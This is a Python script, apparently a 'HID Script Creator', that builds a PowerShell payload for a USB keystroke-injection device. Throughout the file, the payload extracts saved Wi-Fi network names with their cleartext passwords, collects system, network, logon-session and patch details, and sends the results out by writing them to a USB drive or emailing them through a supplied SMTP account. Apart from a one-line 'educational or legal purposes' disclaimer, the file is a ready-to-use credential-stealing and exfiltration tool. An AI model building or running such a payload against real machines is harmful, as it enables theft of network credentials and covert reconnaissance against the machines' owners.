wifi_user_pass = '$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){if($a -gt 1 -And $s ' \
                 '-NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch ' \
                 '"<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim(' \
                 ')}$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match ' \
                 '"Key Content"){$pass=$p.Split(":")[1].Trim();$o+="SSID: $ssid`nPassword: $pass`n`n"}}}$a++;} '

network_info = '$o+="`n`n Network`n`n";$o+=(Get-NetIPConfiguration -All | Out-String);'

computer_info = '$o+="Computer System`n`n";$o+=(Get-WmiObject -Class Win32_ComputerSystem | Out-String);'

os_info = '$o+="Operating System`n`n";$o+=(Get-WmiObject -Class Win32_OperatingSystem | Out-String);'

processor_info = '$o+="Processor Information`n`n";$o+=(Get-WmiObject -Class Win32_Processor | Out-String);'

bios_info = '$o+="BIOS Information`n`n";$o+=(Get-WmiObject -Class Win32_BIOS | Out-String);'

desktop_info = '$o+= "Desktop Information`n`n";$o+=(Get-WmiObject -Class Win32_Desktop | Out-String);'

login_session_info = '$o+="Logon Session`n`n";$o+=(Get-WmiObject -Class Win32_LogonSession | Out-String);'

hotfix_info = '$o+="Hotfixes`n`n";$o+=(Get-WmiObject -Class Win32_QuickFixEngineering | Out-String);'


def run_question(question):
    yes = ['y', 'yes', '']
    msg = " [y/Y = Yes*] [n/N = No] "
    tmp = input("\n" + question + msg)
    tmp = tmp.lower()
    if tmp in yes:
        return True
    return False


output_text = False
output_email = False

smtp_host = None
smtp_port = 587
smtp_user = None
smtp_pass = None
email_to = None

drive_name = None

if __name__ == '__main__':
    print("\nI provide no warranty for this script, use at your own risk. Please only use for educational or legal "
          "purposes.")
    if not run_question("I agree"):
        exit(0)

    if run_question("Output to a text file on usb?"):
        output_text = True
        drive_name = input("Enter the USB storage device name: ").strip()

    if run_question("Email results?"):
        output_email = True
        smtp_host = input("Enter your SMTP host: ").strip()
        smtp_port = input("Enter your SMTP port: ").strip()
        smtp_user = input("Enter your SMTP user: ").strip()
        smtp_pass = input("Enter your SMTP pass: ").strip()
        email_to = input("Send email to: ").strip()

    final_payload = '$o="PiProjects.us HID Script Creator v1.3`n`n PC Name: "+$Env:Computername+"`n`n";'

    if run_question("Gather known WiFi Networks and Passwords?"):
        final_payload = final_payload + wifi_user_pass

    if run_question("Gather network information?"):
        final_payload = final_payload + network_info

    if run_question("Gather computer information?"):
        final_payload = final_payload + computer_info

    if run_question("Gather operating system information?"):
        final_payload = final_payload + os_info

    if run_question("Gather processor information?"):
        final_payload = final_payload + processor_info

    if run_question("Gather BIOS information?"):
        final_payload = final_payload + bios_info

    if run_question("Gather desktop information?"):
        final_payload = final_payload + desktop_info

    if run_question("Gather login session information?"):
        final_payload = final_payload + login_session_info

    if run_question("Gather hotfix information?"):
        final_payload = final_payload + hotfix_info

    if output_text and drive_name is not None:
        final_payload = final_payload + '$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \''
        final_payload = final_payload + drive_name + '\' } | select name '
        final_payload = final_payload + '$o | out-file -filepath $usbPath.name/$Env:Computername.txt -append'

    if output_email:
        final_payload = final_payload + '$c=New-Object Net.Mail.SmtpClient("' + smtp_host + '",' + smtp_port + ');'
        final_payload = final_payload + '$c.EnableSsl=$true;$c.Credentials=New-Object System.Net.NetworkCredential("'
        final_payload = final_payload + smtp_user + '","' + smtp_pass + '");$d=New-Object System.Net.Mail.MailMessage;'
        final_payload = final_payload + '$d.From="' + smtp_user + '";$d.To.Add("' + email_to + '");$d.Subject=($env:'
        final_payload = final_payload + 'UserName+"@"+$env:UserDomain);$d.Body=$o;$c.Send($d);'

    final_payload = final_payload + "exit;"

    print("\n\n")
    print(final_payload)
